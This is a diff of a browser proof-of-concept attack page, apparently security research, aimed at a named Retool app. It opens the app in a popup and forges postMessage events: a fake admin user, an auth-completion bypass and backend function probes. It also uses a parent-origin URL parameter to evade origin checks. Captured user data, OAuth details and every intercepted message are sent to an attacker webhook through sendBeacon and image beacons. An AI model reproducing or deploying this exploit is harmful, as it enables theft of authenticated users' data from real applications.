@@ -21,8 +21,8 @@
 <body>
 <div class="box">
   <div class="spinner" id="spin"></div>
-  <h2 id="msg">Open popup window</h2>
-  <p id="sub">The retool app will open in a new window</p>
+  <h2 id="msg">Ready</h2>
+  <p id="sub">Click to attack</p>
   <div id="log"></div>
 </div>
 
@@ -35,16 +35,24 @@
   var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
   var HOST = 'https://jonjos11.retool.com';
 
-  // Use retool-parent-origin to bypass origin checks
-  var APP_URL = HOST + '/apps/' + APP_ID + '/asa/defaultPage?retool-parent-origin=' + encodeURIComponent(ATK);
+  // Two URLs to test:
+  // 1. Without retool-parent-origin (normal mode)
+  // 2. With retool-parent-origin (IFRAME_HOSTED mode bypass)
+  var APP_URL_NO_BYPASS = HOST + '/apps/' + APP_ID + '/asa/defaultPage';
+  var APP_URL_BYPASS = HOST + '/apps/' + APP_ID + '/asa/defaultPage?retool-parent-origin=' + encodeURIComponent(ATK);
+  var EDITOR_URL_BYPASS = HOST + '/apps/' + APP_ID + '/editor?retool-parent-origin=' + encodeURIComponent(ATK);
+
   var popupRef = null;
+  var msgCount = 0;
 
   function X(payload) {
     var j = JSON.stringify(payload);
+    // sendBeacon (text/plain = no CORS preflight)
     if (navigator.sendBeacon) {
       navigator.sendBeacon(WH, new Blob([j], { type: 'text/plain' }));
     }
-    new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0, 1500));
+    // Image beacon (no CORS needed)
+    new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0, 1400));
   }
 
   function addLog(msg, cls) {
@@ -57,149 +65,78 @@
     el.scrollTop = el.scrollHeight;
   }
 
-  function uid() {
-    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-      var r = Math.random()*16|0, v = c==='x'?r:(r&0x3|0x8);
-      return v.toString(16);
-    });
-  }
-
-  var pendingRequests = {};
-
   // ================================================================
-  // ATTACK: window.open() the retool app
-  // Popup has first-party cookie access → user IS authenticated
-  // We postMessage into the popup → editor forwards to runtime
-  // Runtime's no-origin-check handlers process our messages
+  // ATTACK: Open retool app in popup
+  // We try DIFFERENT URL variants to find what works
   // ================================================================
-  function launchPopup() {
-    popupRef = window.open(APP_URL, 'retoolWin', 'width=1200,height=800,left='+((screen.width-1200)/2)+',top='+((screen.height-800)/2));
+  function launchAttack(url, label) {
+    addLog('Opening: ' + label);
+
+    popupRef = window.open(url, 'retoolWin', 'width=1200,height=800,left='+((screen.width-1200)/2)+',top='+((screen.height-800)/2));
 
     if (!popupRef) {
-      addLog('Popup blocked! Click to allow.', 'warn');
+      addLog('Popup blocked!', 'warn');
       return false;
     }
 
-    addLog('Popup opened — app has real session', 'good');
-    X({ event: 'popup_opened', url: APP_URL, time: new Date().toISOString() });
+    X({ event: 'popup_opened', label: label, url: url, time: new Date().toISOString() });
 
-    // Step 1: Wait for app to load, then request user data
-    setTimeout(function() {
-      if (!popupRef || popupRef.closed) return;
-      addLog('Phase 1: Requesting user data...');
-      try {
-        popupRef.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
-      } catch(e) {}
-    }, 5000);
-
-    // Step 2: Inject fake user with webhook beacon in profilePhotoUrl
-    // This confirms our data is being used by the runtime
-    setTimeout(function() {
-      if (!popupRef || popupRef.closed) return;
-      addLog('Phase 2: Injecting user with beacon...');
-      var beaconId = 'beacon-' + Date.now();
-      try {
-        popupRef.postMessage({
-          type: 'RETOOL_CURRENT_USER',
-          data: {
-            id: 1,
-            email: 'probe@attacker.com',
-            firstName: 'Probe',
-            lastName: 'User',
-            fullName: 'Probe User',
-            profilePhotoUrl: WH + '?beacon=' + beaconId + '&type=profile_photo_loaded',
-            groups: [{ id: 1, name: 'admin' }, { id: 2, name: 'superuser' }],
-            metadata: { _beacon: beaconId, _attacker: ATK },
-            sid: 'inj-' + Date.now(),
-            externalIdentifier: null,
-            locale: 'en'
-          }
-        }, '*');
-      } catch(e) {}
-    }, 8000);
-
-    // Step 3: Auth bypass
-    setTimeout(function() {
-      if (!popupRef || popupRef.closed) return;
-      try {
-        popupRef.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
-      } catch(e) {}
-    }, 9000);
-
-    // Step 4: Probe backend functions with real function name patterns
-    // We try many variants since we don't know the exact names
-    setTimeout(function() {
-      if (!popupRef || popupRef.closed) return;
-      addLog('Phase 3: Probing backend functions...');
-
-      var probes = [
-        // User
-        'getCurrentUser','get_user','getUser','currentUser','me','getMe',
-        'getProfile','userProfile','getCurrentUserId','get_user_info',
-        'getUserInfo','fetchUser','fetch_user','current_user','user',
-        // Organization
-        'getOrganization','get_organization','getOrg','getCurrentOrg',
-        'fetchOrganization','organization','getOrgUsers','listUsers',
-        'getOrganizationUsers','fetchUsers','orgUsers','org_users',
-        // App data
-        'getAppData','getData','fetchData','loadData','getInitialData',
-        'getPageData','getTableData','getRecords','fetchRecords',
-        // Common patterns
-        'query1','query_1','getQuery1','runQuery1','api1','get_api',
-        'readData','read_data','getRows','get_rows','listRecords',
-        'getItems','get_items','fetchItems','fetch_items',
-        // Settings/config
-        'getConfig','get_config','getSettings','get_settings',
-        'appSettings','app_settings','getAppSettings',
-      ];
-
-      var i = 0;
-      var batchInterval = setInterval(function() {
-        if (!popupRef || popupRef.closed) {
-          clearInterval(batchInterval);
-          return;
-        }
-        if (i >= probes.length) {
-          clearInterval(batchInterval);
-          addLog('All ' + probes.length + ' probes sent');
-          X({ event: 'probes_complete', count: probes.length, time: new Date().toISOString() });
-          return;
-        }
-
-        for (var j = 0; j < 3 && i < probes.length; j++, i++) {
-          var reqId = uid();
-          pendingRequests[reqId] = probes[i];
-          try {
-            popupRef.postMessage({
-              type: 'RETOOL_BACKEND_FUNCTION',
-              requestId: reqId,
-              functionName: probes[i],
-              params: {}
-            }, '*');
-          } catch(e) {}
-        }
-      }, 400);
-    }, 12000);
+    // Inject postMessages at intervals
+    setTimeout(function() { sendProbes(); }, 5000);
+    setTimeout(function() { sendProbes(); }, 10000);
+    setTimeout(function() { sendProbes(); }, 15000);
+    setTimeout(function() { sendProbes(); }, 20000);
 
     // Monitor popup
     var monitor = setInterval(function() {
       if (!popupRef || popupRef.closed) {
         clearInterval(monitor);
-        addLog('Popup closed');
-        X({ event: 'popup_closed', pendingCount: Object.keys(pendingRequests).length, time: new Date().toISOString() });
-
-        // If we have pending requests that never got responses, report them
-        var pendingNames = {};
-        for (var rid in pendingRequests) {
-          var name = pendingRequests[rid];
-          pendingNames[name] = (pendingNames[name] || 0) + 1;
-        }
-        X({ event: 'unresolved_probes', pending: pendingNames, time: new Date().toISOString() });
-        return;
+        addLog('Popup closed after ' + label, 'warn');
+        X({ event: 'popup_closed', label: label, msgCount: msgCount, time: new Date().toISOString() });
       }
-    }, 2000);
+    }, 1000);
 
     return true;
+  }
+
+  function sendProbes() {
+    if (!popupRef || popupRef.closed) return;
+
+    // RETOOL_CURRENT_USER - inject a test user with beacon
+    try {
+      popupRef.postMessage({
+        type: 'RETOOL_CURRENT_USER',
+        data: {
+          id: 1,
+          email: 'probe@attacker.com',
+          firstName: 'Probe',
+          lastName: 'User',
+          fullName: 'Probe User',
+          profilePhotoUrl: WH + '?beacon=photo&ts=' + Date.now(),
+          groups: [{ id: 1, name: 'admin' }],
+          metadata: { _beacon: true, _ts: Date.now() },
+          sid: 'inj-' + Date.now(),
+          externalIdentifier: null,
+          locale: 'en'
+        }
+      }, '*');
+    } catch(e) {}
+
+    // RETOOL_CURRENT_USER_REQUEST - ask for real user
+    setTimeout(function() {
+      if (!popupRef || popupRef.closed) return;
+      try {
+        popupRef.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
+      } catch(e) {}
+    }, 500);
+
+    // RETOOL_AUTH_COMPLETE - bypass auth
+    setTimeout(function() {
+      if (!popupRef || popupRef.closed) return;
+      try {
+        popupRef.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
+      } catch(e) {}
+    }, 1000);
   }
 
   // ================================================================
@@ -209,93 +146,76 @@
     var d = e.data;
     if (!d || typeof d !== 'object' || !d.type) return;
 
+    msgCount++;
+
     var fromPopup = false;
     try {
       fromPopup = popupRef && (e.source === popupRef);
     } catch(ex) {}
 
-    var dir = fromPopup ? '←RECV' : '→SENT';
-    var summary = '';
-
-    if (d.type === 'RETOOL_CURRENT_USER' && d.data) {
-      summary = ' email=' + (d.data.email || '?') + ' name=' + (d.data.fullName || '?') +
-                ' groups=' + JSON.stringify((d.data.groups || []).map(function(g){return g.name;}));
-      if (fromPopup && d.data.email && d.data.email.indexOf('probe@') === -1 && d.data.email.indexOf('xss-probe@') === -1) {
-        addLog('REAL USER DATA: ' + d.data.email + ' (' + d.data.fullName + ')', 'good');
-        document.getElementById('msg').textContent = 'REAL USER DATA CAPTURED!';
-        document.getElementById('sub').textContent = d.data.email;
-        document.getElementById('spin').style.display = 'none';
-        X({ event: 'REAL_USER_DATA', userData: d.data, time: new Date().toISOString() });
-      }
-    } else if (d.type === 'RETOOL_BACKEND_RESULT') {
-      var reqFn = d.requestId && pendingRequests[d.requestId];
-      if (reqFn) {
-        summary = ' fn=' + reqFn + ' — DATA CAPTURED!';
-        delete pendingRequests[d.requestId];
-        addLog('BACKEND RESULT: ' + reqFn + ' returned data!', 'good');
-        X({
-          event: 'BACKEND_RESULT',
-          functionName: reqFn,
-          requestId: d.requestId,
-          data: d.data,
-          time: new Date().toISOString()
-        });
-      } else {
-        summary = ' unknown requestId=' + (d.requestId || '?').slice(0,8);
-      }
-    } else if (d.type === 'RETOOL_CURRENT_USER_REQUEST') {
-      summary = ' (app needs user data)';
-      if (fromPopup) addLog('App is asking for user — needs parent to provide it', 'warn');
-    } else if (d.type === 'RETOOL_BACKEND_FUNCTION') {
-      summary = ' fn=' + (d.functionName || '?');
-      if (fromPopup) addLog('Backend call from app: ' + (d.functionName || '?'), 'good');
-    } else if (d.type === 'RR_OAUTH_RESOURCE') {
-      summary = ' resource=' + (d.resourceName || '?');
-    }
-
-    addLog(dir + ' ' + d.type + summary, fromPopup && (d.type === 'RETOOL_BACKEND_RESULT' || (d.type === 'RETOOL_CURRENT_USER' && d.data && d.data.email && d.data.email.indexOf('probe@') === -1)) ? 'good' : '');
+    var dir = fromPopup ? 'RECV' : 'SENT';
+    addLog(dir + ' ' + d.type + (fromPopup ? ' ← FROM APP' : ''), fromPopup ? 'good' : '');
 
     X({
-      event: 'postmessage',
-      direction: dir,
+      event: 'pm',
+      dir: dir,
       type: d.type,
       data: d,
       origin: e.origin,
       time: new Date().toISOString()
     });
-  });
 
-  // ================================================================
-  // START — auto-launch popup on click
-  // ================================================================
-  document.getElementById('msg').textContent = 'Ready';
-  document.getElementById('sub').textContent = 'Click anywhere to launch';
-  document.getElementById('spin').style.display = 'none';
-  addLog('PoC ready. Click to open retool popup.');
+    // Check for real user data (not our probes)
+    if (fromPopup && d.type === 'RETOOL_CURRENT_USER' && d.data) {
+      var email = d.data.email || '';
+      if (email && email !== 'probe@attacker.com' && email.indexOf('xss') === -1) {
+        addLog('REAL USER DATA: ' + email, 'good');
+        document.getElementById('msg').textContent = 'REAL DATA!';
+        document.getElementById('sub').textContent = email;
+        X({ event: 'REAL_USER', data: d.data, time: new Date().toISOString() });
+      }
+    }
 
-  // Track if we've already attempted
-  var launched = false;
+    if (fromPopup && d.type === 'RR_OAUTH_RESOURCE') {
+      addLog('OAUTH RESOURCE: ' + (d.resourceName || '?'), 'good');
+    }
 
-  document.body.addEventListener('click', function() {
-    if (launched) return;
-    launched = true;
-
-    document.getElementById('msg').textContent = 'Attacking...';
-    document.getElementById('sub').textContent = 'Popup opened — check webhook';
-    document.getElementById('spin').style.display = 'block';
-
-    X({ event: 'attack_start', attacker: ATK, host: HOST, appId: APP_ID, url: APP_URL, time: new Date().toISOString() });
-
-    if (!launchPopup()) {
-      // Popup blocked — wait for next click
-      launched = false;
-      document.getElementById('msg').textContent = 'Popup blocked';
-      document.getElementById('sub').textContent = 'Enable popups and click again';
-      document.getElementById('spin').style.display = 'none';
+    if (d.type === 'source' && d.url) {
+      addLog('OAuth callback URL: ' + d.url, 'good');
     }
   });
 
-  X({ event: 'page_load', url: location.href, referrer: document.referrer, ua: navigator.userAgent, time: new Date().toISOString() });
+  // ================================================================
+  // START
+  // ================================================================
+  document.getElementById('msg').textContent = 'Ready';
+  document.getElementById('sub').textContent = 'Click to attack';
+  document.getElementById('spin').style.display = 'none';
+  addLog('Test 1: popup WITHOUT retool-parent-origin');
+  addLog('Test 2: popup WITH retool-parent-origin');
+  addLog('Test 3: editor popup WITH retool-parent-origin');
+
+  var testNum = 0;
+
+  document.body.addEventListener('click', function go() {
+    document.body.removeEventListener('click', go);
+    document.getElementById('msg').textContent = 'Attacking...';
+    document.getElementById('spin').style.display = 'block';
+
+    X({ event: 'start', attacker: ATK, time: new Date().toISOString() });
+
+    testNum++;
+    if (testNum === 1) {
+      document.getElementById('sub').textContent = 'Test 1: Normal popup';
+      launchAttack(APP_URL_NO_BYPASS, 'test1-no-bypass');
+    } else if (testNum === 2) {
+      document.getElementById('sub').textContent = 'Test 2: With origin bypass';
+      launchAttack(APP_URL_BYPASS, 'test2-with-bypass');
+    } else {
+      document.getElementById('sub').textContent = 'Test 3: Editor bypass';
+      launchAttack(EDITOR_URL_BYPASS, 'test3-editor-bypass');
+    }
+  });
 
 })();
 </script>
